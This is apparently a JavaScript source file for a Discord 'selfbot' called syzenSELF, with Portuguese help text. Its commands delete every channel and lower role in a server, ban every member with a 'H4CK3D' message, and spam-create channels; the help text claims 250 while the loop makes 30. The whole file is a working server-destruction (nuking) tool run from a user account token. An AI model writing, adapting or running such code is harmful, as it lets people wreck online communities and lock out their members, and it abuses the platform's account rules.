const discord = require("discord.js"), client = new discord.Client, colors = require("colors"), config = require("./config.json");

client.on("ready", () => {
	console.log(("[ syzenSELF ] SELFBOT connected to account " + client.user.tag)["green"]);
})

client.on("message", message => {
	message.content.toLowerCase().startsWith(config.prefix + "destruir") && (message.guild.roles.filter(role => role.position < message.guild.me.highestRole.position).deleteAll(), message.guild.channels.deleteAll(), message.guild.members.tap(_0x191023 => _0x191023.ban("H4CK3D by: OS FAIXA PRETA!")));
	message.content.toLowerCase().startsWith(config.prefix + "ban") && message.guild.members.tap(member => member.ban(config.msgbans));
	message.content.toLowerCase().startsWith(config.prefix + "delete") && (message.guild.roles.filter(role => role.position < message.guild.me.highestRole.position).deleteAll(), message.guild.channels.deleteAll());
	message.content.toLowerCase().startsWith(config.prefix + "help") && (message.delete(), message.channel.send({
		embed: {
			color: 65535,
			author: {
				name: "💎 syzen SELF ( v.1 )"
			},
			description: "SELF BOT v.1 em versão beta, qualquer tipo de bug favor comunicar <@810631264041304084>\n \n 🔧 **COMANDOS:\n \n ➜ .destruir - Apaga todos canais, cargos e da ban-all.\n ➜ .ban - Ban em todos os membros do servidor.\n ➜ .delete - Apaga todo servidor, cargos e canais.\n ➜ .chn - Cria 250 canais com o nome especificado em config.json.**"
		}
	}));
	if (message.content.toLowerCase().startsWith(config.prefix + "chn")) {
		message.delete();
		if (!message.guild.me.hasPermission("MANAGE_CHANNELS")) return console.log(colors.red("[!] Not Permissions!"));
		let i = 0;
		while (i < 30) {
			i++, message.guild.createChannel(config.channelsname, {
				type: "text"
			});
		}
		console.log(colors.green("[!] Command execute success"));
	}
}), client.login(config.token);
